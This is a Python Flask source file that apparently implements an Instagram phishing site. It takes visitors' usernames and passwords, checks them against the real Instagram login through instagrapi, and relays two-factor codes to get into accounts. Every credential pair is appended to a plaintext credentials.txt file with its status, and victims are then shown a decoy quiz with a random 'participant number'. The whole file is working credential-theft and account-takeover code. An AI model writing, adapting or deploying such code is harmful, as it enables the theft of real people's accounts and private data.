from flask import Flask, request, render_template, session, redirect, url_for
from instagrapi import Client
from instagrapi.exceptions import TwoFactorRequired, LoginRequired, BadPassword
import random
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your-secret-key'  # Change this to a secure random key
cl = Client()

# Function to save credentials to a text file
def save_credentials(username, password, status, filename="credentials.txt"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, 'a') as file:  # 'a' mode appends to the file
        file.write(f"[{timestamp}] Username: {username}, Password: {password}, Status: {status}\n")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        session.clear()
        session['username'] = username
        session['password'] = password
        
        global cl
        cl = Client()  # Fresh client instance
        try:
            login_result = cl.login(username, password)
            if login_result:
                print(f"Login successful - Username: {username}")
                save_credentials(username, password, "Success")  # Save successful login
                session['logged_in'] = True
                return redirect(url_for('questions'))
            else:
                print("Login failed: Invalid response from server")
                save_credentials(username, password, "Failed - Invalid response")  # Save failed attempt
                return render_template('login.html', error="Login failed: Invalid response from server")
                
        except TwoFactorRequired:
            print(f"Captured - Username: {username}, Password: {password} (2FA required)")
            save_credentials(username, password, "2FA Required")  # Save 2FA case
            session['2fa_required'] = True
            return redirect(url_for('two_factor'))
            
        except BadPassword:
            print(f"Login failed - Incorrect password for: {username}")
            save_credentials(username, password, "Failed - Bad Password")  # Save bad password
            return render_template('login.html', error="Incorrect password")
            
        except Exception as e:
            print(f"Login failed - Unexpected error: {type(e).__name__}: {str(e)}")
            save_credentials(username, password, f"Failed - {type(e).__name__}: {str(e)}")  # Save other errors
            return render_template('login.html', error=f"Login failed: {type(e).__name__}: {str(e)}")
            
    return render_template('login.html')

@app.route('/two_factor', methods=['GET', 'POST'])
def two_factor():
    if not session.get('2fa_required'):
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        two_factor_code = request.form['two_factor_code']
        global cl
        cl = Client()  # Fresh client instance
        try:
            cl.login(
                session['username'], 
                session['password'], 
                verification_code=two_factor_code.strip()
            )
            print(f"2FA Login successful - Code: {two_factor_code}")
            save_credentials(session['username'], session['password'], "2FA Success")  # Save 2FA success
            session.pop('2fa_required', None)
            session['logged_in'] = True
            return redirect(url_for('questions'))
        except Exception as e:
            print(f"2FA login failed - Error: {type(e).__name__}: {str(e)}")
            save_credentials(session['username'], session['password'], f"2FA Failed - {type(e).__name__}: {str(e)}")  # Save 2FA failure
            return render_template('two_factor.html', error=f"2FA verification failed: {str(e)}")
    return render_template('two_factor.html')

@app.route('/questions', methods=['GET', 'POST'])
def questions():
    if not session.get('logged_in') or 'username' not in session:
        print("Session check failed - Redirecting to login")
        return redirect(url_for('login'))
        
    if request.method == 'POST' and not session.get('quiz_completed'):
        participant_number = random.randint(100000, 9999999)
        session['participant_number'] = participant_number
        session['quiz_completed'] = True
        return render_template('result.html',
                             username=session['username'],
                             participant_number=participant_number)
    return render_template('questions.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)